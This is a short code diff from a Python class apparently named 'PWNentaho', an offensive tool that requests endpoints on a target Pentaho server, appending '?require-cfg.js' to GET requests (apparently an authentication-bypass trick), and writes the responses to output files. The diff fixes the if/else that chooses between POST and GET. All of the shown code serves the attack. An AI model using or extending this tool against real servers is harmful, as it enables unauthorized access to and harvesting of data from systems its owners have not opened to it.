@@ -22,8 +22,8 @@ class PWNentaho:
                 try:
                     if "?" in endpoint:
                         response = requests.post(f"{target}/{endpoint}", timeout=5)
-
-                    response = requests.get(f"{target}/{endpoint}?require-cfg.js", timeout=5)
+                    else:
+                        response = requests.get(f"{target}/{endpoint}?require-cfg.js", timeout=5)
                     response.raise_for_status()
                     filename = self._extract_filename(endpoint) + ".txt"
                     with open(f"outputs/{filename}", "w") as f:
